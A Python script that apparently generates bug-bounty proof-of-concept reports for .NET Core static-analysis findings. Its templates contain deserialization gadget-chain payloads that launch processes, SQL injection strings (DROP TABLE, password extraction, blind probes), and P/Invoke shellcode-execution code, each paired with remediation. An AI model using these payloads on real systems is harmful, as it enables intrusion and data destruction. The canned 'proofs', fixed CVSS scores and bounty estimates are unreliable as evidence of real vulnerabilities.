#!/usr/bin/env python3
"""
Microsoft .NET Core Proof-of-Concept Generator
Generate detailed POCs for identified vulnerabilities
"""

import json
import logging
from datetime import datetime
from typing import Dict, List, Any

class DotNetPOCGenerator:
    def __init__(self, analysis_file: str):
        self.analysis_file = analysis_file
        self.analysis_data = self.load_analysis_data()

        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def load_analysis_data(self) -> Dict[str, Any]:
        """Load analysis results from JSON file"""
        try:
            with open(self.analysis_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Error loading analysis data: {e}")
            return {}

    def generate_critical_pocs(self) -> List[Dict[str, Any]]:
        """Generate POCs for critical vulnerabilities"""
        critical_vulns = [
            v for v in self.analysis_data.get('detailed_findings', [])
            if v.get('severity') == 'CRITICAL'
        ]

        pocs = []
        for vuln in critical_vulns[:10]:  # Top 10 critical vulnerabilities
            poc = self.create_detailed_poc(vuln)
            pocs.append(poc)

        return pocs

    def create_detailed_poc(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Create detailed POC for a vulnerability"""
        vuln_type = vulnerability.get('type', '')

        poc_data = {
            'vulnerability_id': f"DOTNET-{hash(str(vulnerability)) % 100000:05d}",
            'title': f"{vuln_type.upper()} in {vulnerability.get('file', '').split('/')[-1]}",
            'severity': vulnerability.get('severity'),
            'file_path': vulnerability.get('file'),
            'line_number': vulnerability.get('line'),
            'vulnerable_code': vulnerability.get('code'),
            'description': vulnerability.get('description'),
            'impact': self.get_impact_description(vuln_type),
            'proof_of_concept': self.generate_poc_code(vulnerability),
            'exploitation_steps': self.get_exploitation_steps(vuln_type),
            'remediation': vulnerability.get('recommendation'),
            'references': self.get_references(vuln_type),
            'cvss_score': self.calculate_cvss_score(vulnerability),
            'bounty_potential': self.assess_bounty_potential(vulnerability)
        }

        return poc_data

    def generate_poc_code(self, vulnerability: Dict[str, Any]) -> str:
        """Generate specific POC code based on vulnerability type"""
        vuln_type = vulnerability.get('type', '')
        file_path = vulnerability.get('file', '')
        code = vulnerability.get('code', '')

        if vuln_type == 'unsafe_code':
            return f'''
// VULNERABILITY: Unsafe Code Block Detection
// FILE: {file_path}
// LINE: {vulnerability.get('line', 0)}

// Vulnerable Code:
{code}

// PROOF OF CONCEPT:
// 1. Unsafe code allows direct memory manipulation
// 2. This can lead to buffer overflows and memory corruption
// 3. Potential for arbitrary code execution

// Example Exploitation Scenario:
unsafe void VulnerableFunction(byte* ptr, int size)
{{
    // No bounds checking - potential buffer overflow
    for (int i = 0; i < size + 10; i++)  // +10 causes overflow
    {{
        ptr[i] = 0xFF;  // Writing beyond allocated memory
    }}
}}

// Attack Vector:
// 1. Attacker controls 'size' parameter
// 2. Attacker provides size that causes buffer overflow
// 3. Memory corruption can lead to code execution

// REMEDIATION:
// 1. Avoid unsafe code blocks unless absolutely necessary
// 2. Use safe alternatives like Span<T> or Memory<T>
// 3. Implement proper bounds checking
// 4. Use static analysis tools to detect unsafe patterns

span<byte> SafeFunction(span<byte> data)
{{
    // Bounds-checked access
    for (int i = 0; i < data.Length; i++)
    {{
        data[i] = 0xFF;  // Safe access with automatic bounds checking
    }}
    return data;
}}
'''

        elif vuln_type == 'deserialize_vuln':
            return f'''
// VULNERABILITY: Insecure Deserialization
// FILE: {file_path}
// LINE: {vulnerability.get('line', 0)}

// Vulnerable Code:
{code}

// PROOF OF CONCEPT:
// 1. JsonConvert.DeserializeObject without type validation
// 2. Can lead to arbitrary object instantiation
// 3. Potential for remote code execution

// Malicious JSON Payload:
string maliciousJson = @"{{
    ""$type"": ""System.Diagnostics.Process, System"",
    ""StartInfo"": {{
        ""FileName"": ""calc.exe"",
        ""Arguments"": """"
    }}
}}";

// Exploitation:
// When this JSON is deserialized with TypeNameHandling.All:
var settings = new JsonSerializerSettings()
{{
    TypeNameHandling = TypeNameHandling.All
}};
var result = JsonConvert.DeserializeObject(maliciousJson, settings);
// This could execute calc.exe on Windows

// Advanced Payload for .NET Gadget Chain:
string advancedPayload = @"{{
    ""$type"": ""System.Windows.Data.ObjectDataProvider, PresentationFramework"",
    ""MethodName"": ""Start"",
    ""ObjectInstance"": {{
        ""$type"": ""System.Diagnostics.Process, System""
    }},
    ""MethodParameters"": {{
        ""$type"": ""System.Collections.ArrayList"",
        ""$values"": [
            ""cmd.exe"",
            ""/c echo pwned > c:\\temp\\pwned.txt""
        ]
    }}
}}";

// REMEDIATION:
// 1. Never use TypeNameHandling.All with untrusted input
// 2. Use allow-lists for deserialization
// 3. Implement custom JsonConverter with type validation
// 4. Use System.Text.Json instead of Newtonsoft.Json for better security

// Safe Deserialization:
public class SafeDeserializer
{{
    private static readonly string[] AllowedTypes = {{ "MyApp.Models.User", "MyApp.Models.Product" }};

    public T SafeDeserialize<T>(string json) where T : class
    {{
        var settings = new JsonSerializerSettings()
        {{
            TypeNameHandling = TypeNameHandling.None,  // Disable type name handling
            SerializationBinder = new SafeSerializationBinder(AllowedTypes)
        }};
        return JsonConvert.DeserializeObject<T>(json, settings);
    }}
}}
'''

        elif vuln_type == 'sql_injection':
            return f'''
// VULNERABILITY: SQL Injection
// FILE: {file_path}
// LINE: {vulnerability.get('line', 0)}

// Vulnerable Code:
{code}

// PROOF OF CONCEPT:
// 1. User input directly concatenated into SQL query
// 2. No input validation or parameterization
// 3. Allows arbitrary SQL execution

// Attack Payload:
string maliciousInput = "'; DROP TABLE Users; --";
string anotherPayload = "' UNION SELECT username, password FROM AdminUsers --";

// When injected into vulnerable code:
// Original query: SELECT * FROM Users WHERE id = 'USER_INPUT'
// Becomes: SELECT * FROM Users WHERE id = ''; DROP TABLE Users; --'

// Advanced SQL Injection Examples:

// 1. Data Extraction:
string dataExfiltration = "' UNION SELECT table_name, column_name FROM information_schema.columns --";

// 2. Blind SQL Injection:
string blindSqli = "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --";

// 3. Time-based Blind SQL Injection:
string timeBased = "'; WAITFOR DELAY '00:00:05' --";

// 4. Boolean-based Blind SQL Injection:
string booleanBased = "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') --";

// REMEDIATION:
// Use parameterized queries:
using (var command = new SqlCommand("SELECT * FROM Users WHERE id = @id", connection))
{{
    command.Parameters.AddWithValue("@id", userInput);
    var reader = command.ExecuteReader();
}}

// Or use Entity Framework:
var user = context.Users.Where(u => u.Id == userInput).FirstOrDefault();

// Additional Security Measures:
// 1. Input validation and sanitization
// 2. Least privilege database access
// 3. Stored procedures with parameters
// 4. SQL injection detection/prevention tools
'''

        elif vuln_type == 'pinvoke':
            return f'''
// VULNERABILITY: P/Invoke Security Risk
// FILE: {file_path}
// LINE: {vulnerability.get('line', 0)}

// Vulnerable Code:
{code}

// PROOF OF CONCEPT:
// 1. P/Invoke calls can bypass .NET security model
// 2. Direct access to unmanaged code
// 3. Potential for privilege escalation and system compromise

// Example Dangerous P/Invoke:
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

// Exploitation Scenario:
// 1. Load arbitrary DLL
IntPtr hModule = LoadLibrary("malicious.dll");

// 2. Get function address
IntPtr funcAddr = GetProcAddress(hModule, "MaliciousFunction");

// 3. Execute unmanaged code
var func = Marshal.GetDelegateForFunctionPointer<Action>(funcAddr);
func();

// Advanced Attack - Code Injection:
// 1. Allocate executable memory
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

// 2. Write shellcode
byte[] shellcode = {{ 0x90, 0x90, 0x90, 0xC3 }}; // NOP NOP NOP RET
IntPtr memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
Marshal.Copy(shellcode, 0, memory, shellcode.Length);

// 3. Execute shellcode
var shellcodeFunc = Marshal.GetDelegateForFunctionPointer<Action>(memory);
shellcodeFunc();

// REMEDIATION:
// 1. Minimize P/Invoke usage
// 2. Validate all inputs to P/Invoke calls
// 3. Use SafeHandle for resource management
// 4. Apply principle of least privilege
// 5. Code access security (if applicable)
// 6. Use managed alternatives when possible

// Safe P/Invoke Example:
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
static extern bool MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

// Input validation
public static void SafeMessageBox(string message, string caption)
{{
    if (string.IsNullOrEmpty(message) || message.Length > 1000)
        throw new ArgumentException("Invalid message");

    if (string.IsNullOrEmpty(caption) || caption.Length > 100)
        throw new ArgumentException("Invalid caption");

    MessageBox(IntPtr.Zero, message, caption, 0);
}}
'''

        else:
            return f'''
// VULNERABILITY: {vuln_type.upper()}
// FILE: {file_path}
// LINE: {vulnerability.get('line', 0)}

// Vulnerable Code:
{code}

// PROOF OF CONCEPT:
// Security vulnerability detected in .NET Core codebase
// Manual analysis required for specific exploitation vectors

// General Security Recommendations:
// 1. Review the vulnerable code context
// 2. Implement input validation
// 3. Follow secure coding practices
// 4. Use static analysis tools
// 5. Conduct security testing
'''

    def get_impact_description(self, vuln_type: str) -> str:
        """Get detailed impact description for vulnerability type"""
        impacts = {
            'unsafe_code': 'Memory corruption, buffer overflows, arbitrary code execution, privilege escalation',
            'deserialize_vuln': 'Remote code execution, data tampering, denial of service, privilege escalation',
            'sql_injection': 'Data breach, data manipulation, unauthorized access, system compromise',
            'pinvoke': 'Privilege escalation, system compromise, security control bypass',
            'xss': 'Session hijacking, credential theft, malicious redirects, defacement',
            'command_injection': 'Remote code execution, system compromise, data exfiltration',
            'path_traversal': 'Information disclosure, unauthorized file access, system compromise',
            'xxe': 'Information disclosure, denial of service, server-side request forgery'
        }
        return impacts.get(vuln_type, 'Security compromise, potential for unauthorized access')

    def get_exploitation_steps(self, vuln_type: str) -> List[str]:
        """Get step-by-step exploitation guide"""
        steps = {
            'unsafe_code': [
                "1. Identify unsafe code blocks in the application",
                "2. Analyze memory layout and buffer boundaries",
                "3. Craft input to trigger buffer overflow",
                "4. Control execution flow through memory corruption",
                "5. Execute arbitrary code with application privileges"
            ],
            'deserialize_vuln': [
                "1. Identify deserialization endpoints accepting JSON/XML",
                "2. Analyze serialization settings and type handling",
                "3. Craft malicious payload with gadget chains",
                "4. Submit payload to trigger object instantiation",
                "5. Achieve code execution through deserialization"
            ],
            'sql_injection': [
                "1. Identify input parameters used in SQL queries",
                "2. Test for SQL injection using basic payloads",
                "3. Determine database type and structure",
                "4. Extract sensitive data or execute commands",
                "5. Escalate privileges or compromise system"
            ],
            'pinvoke': [
                "1. Analyze P/Invoke declarations and usage",
                "2. Identify unvalidated input to native functions",
                "3. Craft malicious input to exploit native code",
                "4. Bypass .NET security controls",
                "5. Execute arbitrary native code"
            ]
        }
        return steps.get(vuln_type, [
            "1. Analyze vulnerability context and requirements",
            "2. Craft appropriate exploitation payload",
            "3. Trigger vulnerability through application interface",
            "4. Verify successful exploitation",
            "5. Document impact and potential escalation"
        ])

    def get_references(self, vuln_type: str) -> List[str]:
        """Get security references for vulnerability type"""
        references = {
            'unsafe_code': [
                "https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/unsafe-code",
                "https://owasp.org/www-community/vulnerabilities/Buffer_overflow_attack",
                "https://cwe.mitre.org/data/definitions/120.html"
            ],
            'deserialize_vuln': [
                "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
                "https://github.com/pwntester/ysoserial.net",
                "https://cwe.mitre.org/data/definitions/502.html"
            ],
            'sql_injection': [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                "https://docs.microsoft.com/en-us/sql/relational-databases/security/sql-injection"
            ],
            'pinvoke': [
                "https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke",
                "https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization",
                "https://cwe.mitre.org/data/definitions/20.html"
            ]
        }
        return references.get(vuln_type, [
            "https://owasp.org/www-project-top-ten/",
            "https://cwe.mitre.org/",
            "https://docs.microsoft.com/en-us/dotnet/standard/security/"
        ])

    def calculate_cvss_score(self, vulnerability: Dict[str, Any]) -> float:
        """Calculate CVSS score for vulnerability"""
        severity_scores = {
            'CRITICAL': 9.5,
            'HIGH': 7.5,
            'MEDIUM': 5.0,
            'LOW': 2.0
        }
        return severity_scores.get(vulnerability.get('severity', 'LOW'), 2.0)

    def assess_bounty_potential(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Assess bug bounty potential for vulnerability"""
        vuln_type = vulnerability.get('type', '')
        severity = vulnerability.get('severity', 'LOW')

        # Based on Microsoft .NET bounty program
        bounty_ranges = {
            'CRITICAL': {'min': 15000, 'max': 40000, 'likelihood': 'High'},
            'HIGH': {'min': 5000, 'max': 15000, 'likelihood': 'Medium'},
            'MEDIUM': {'min': 500, 'max': 5000, 'likelihood': 'Low'},
            'LOW': {'min': 0, 'max': 500, 'likelihood': 'Very Low'}
        }

        base_assessment = bounty_ranges.get(severity, bounty_ranges['LOW'])

        # Adjust based on vulnerability type
        high_value_types = ['unsafe_code', 'deserialize_vuln', 'command_injection']
        if vuln_type in high_value_types and severity in ['CRITICAL', 'HIGH']:
            base_assessment['likelihood'] = 'Very High'
            base_assessment['max'] = min(base_assessment['max'] * 1.5, 40000)

        return {
            'estimated_range': f"${base_assessment['min']:,} - ${base_assessment['max']:,}",
            'likelihood': base_assessment['likelihood'],
            'justification': f"{severity} severity {vuln_type} vulnerability in .NET Core",
            'submission_requirements': [
                "Provide clear reproduction steps",
                "Demonstrate security impact",
                "Test on supported .NET Core versions",
                "Follow responsible disclosure guidelines"
            ]
        }

    def generate_report(self) -> str:
        """Generate comprehensive POC report"""
        pocs = self.generate_critical_pocs()

        report = f"""
# Microsoft .NET Core Security Analysis - Proof of Concept Report

**Analysis Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Target:** Microsoft .NET Core / ASP.NET Core Repository
**Total Vulnerabilities Analyzed:** {len(self.analysis_data.get('detailed_findings', []))}
**Critical POCs Generated:** {len(pocs)}

## Executive Summary

This report contains detailed proof-of-concept exploits for critical security vulnerabilities
identified in the Microsoft .NET Core ecosystem. The vulnerabilities range from unsafe code
usage to insecure deserialization patterns.

**Risk Assessment:**
- Overall Risk Level: {self.analysis_data.get('risk_level', 'Unknown')}
- Risk Score: {self.analysis_data.get('risk_score', 0)}
- Critical Issues: {self.analysis_data.get('severity_distribution', {}).get('CRITICAL', 0)}

## Detailed Proof of Concepts

"""

        for i, poc in enumerate(pocs, 1):
            report += f"""
### {i}. {poc['title']}

**Vulnerability ID:** {poc['vulnerability_id']}
**Severity:** {poc['severity']}
**CVSS Score:** {poc['cvss_score']}
**File:** {poc['file_path']}
**Line:** {poc['line_number']}

**Description:**
{poc['description']}

**Impact:**
{poc['impact']}

**Exploitation Steps:**
"""
            for step in poc['exploitation_steps']:
                report += f"{step}\n"

            report += f"""
**Proof of Concept Code:**
```csharp
{poc['proof_of_concept']}
```

**Remediation:**
{poc['remediation']}

**Bug Bounty Assessment:**
- **Estimated Value:** {poc['bounty_potential']['estimated_range']}
- **Likelihood:** {poc['bounty_potential']['likelihood']}
- **Justification:** {poc['bounty_potential']['justification']}

**References:**
"""
            for ref in poc['references']:
                report += f"- {ref}\n"

            report += "\n---\n"

        report += f"""
## Conclusion

The analysis identified {len(self.analysis_data.get('detailed_findings', []))} security issues
in the .NET Core codebase, with {self.analysis_data.get('severity_distribution', {}).get('CRITICAL', 0)}
critical vulnerabilities requiring immediate attention.

### Key Recommendations:
1. **Immediate Action Required:** Address all critical unsafe code usage
2. **Review Deserialization:** Audit all JSON deserialization patterns
3. **Security Training:** Implement secure coding practices
4. **Static Analysis:** Deploy comprehensive security scanning tools
5. **Bug Bounty:** Consider reporting high-value findings to Microsoft

### Next Steps:
1. Validate findings in controlled environment
2. Develop comprehensive remediation plan
3. Implement security controls and monitoring
4. Consider responsible disclosure for critical issues

---
*This report was generated by automated security analysis tools and requires manual validation before submission to bug bounty programs.*
"""

        return report

def main():
    """Generate comprehensive POC report"""
    poc_generator = DotNetPOCGenerator('dotnet_comprehensive_security_report.json')
    report = poc_generator.generate_report()

    # Save report
    with open('DOTNET_COMPREHENSIVE_POC_REPORT.md', 'w') as f:
        f.write(report)

    print("Comprehensive POC report generated: DOTNET_COMPREHENSIVE_POC_REPORT.md")

    # Generate JSON data for further analysis
    pocs = poc_generator.generate_critical_pocs()
    with open('dotnet_pocs.json', 'w') as f:
        json.dump(pocs, f, indent=2, default=str)

    print(f"Generated {len(pocs)} detailed POCs")

if __name__ == "__main__":
    main()